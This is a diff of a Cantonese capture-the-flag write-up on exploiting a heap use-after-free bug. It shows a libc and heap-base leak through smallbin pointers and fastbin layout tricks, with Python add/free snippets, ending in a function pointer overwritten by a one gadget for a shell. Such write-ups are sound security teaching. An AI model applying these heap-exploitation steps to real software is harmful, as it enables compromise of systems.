@@ -47,17 +47,19 @@ heap view :
 0x6020c0 <list+32>:	0x0000000000000000	0x0000000000000000
 
 ```
-個bug就係呢到,free完之後上面個table,係相應位置冇set 0,引致use after free
+個bug就係呢到,free完之後,係上面個table,相應位置冇set 0,引致use after free
 
 可以開始exploit 
 
-不過由於無edit function 所以我地唔可以用unlink->GOT Hijacking 
+不過由於無edit function 所以我地唔可以用unlink attack 做GOT Hijacking 
 
 普通fastbin attack 都唔得,因為add 會先malloc function pointer chunk再malloc content chunk
 
-由於我地控制唔到function pointer chunk 會去乜位所以就會crash 
+由於我地控制唔到function pointer chunk 去乜位,所以就會crash 
 
 不過點都好我地都要leak libc, heapbase (呢到無用)
+
+只要利用smallbin free完之後嘅fd bk pointer再配合puts leak libc heapbase 出黎(可以參考[Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html))  
 
 ```python
 print "[+] Leaking heapbase : "
@@ -86,9 +88,8 @@ add(0,128,"DDDDDDD")
 leakk=leak("DDDDDDD",0)
 ```
 
-只要利用smallbin free完之後嘅fd bk pointer再配合puts leak libc heapbase 出黎(可以參考[Mental Snapshot - _int_free and unlink](http://uaf.io/exploitation/misc/2016/09/11/_int_free-Mental-Snapshot.html))  
 
-Exploit :
+# Exploit :
 
 首先我地要malloc 一個Fastbin with content <0x20 嘅chunk 加兩個好大嘅chunk ,1個 padding (add(3,128,"X"))
 )
@@ -101,11 +102,8 @@ add(1,800,"T"*300)
 add(2,500,"B"*300)
 add(3,128,"X")
 ```
-再用呢個次序free左佢
- 
-咁下一次malloc嘅function pointer chunk 位置會拎到上面細chunk content位置(fastbin LIFO features)
 
-Content chunk 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)
+再用呢個次序free左佢:
 
 ```python
 free(3)
@@ -113,10 +111,16 @@ free(2)
 free(1)
 free(0)
 ```
-再一個大chunk (size=900)我地會完整覆蓋到以前嘅chunk 3
  
-係chunk 3 function pointer chunk 位置放one gadget
-利用use after free 走去menu spell->3 get shell
+下一次malloc嘅function pointer chunk, 會拎返上面細chunk content位置(fastbin LIFO features)
+
+Content chunk 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)
+
+再malloc一個大chunk (size=900), 我地會完整覆蓋到以前嘅chunk 3
+ 
+再係原table[3]指住嘅heap address 位置放one gadget
+
+利用use after free 走去menu spell->3 get shell(因為正常情怳下,spell係會先call table指住嘅heap address 嘅funciton做printing)
 
 ```python
 known_heap=heapbase+0x190
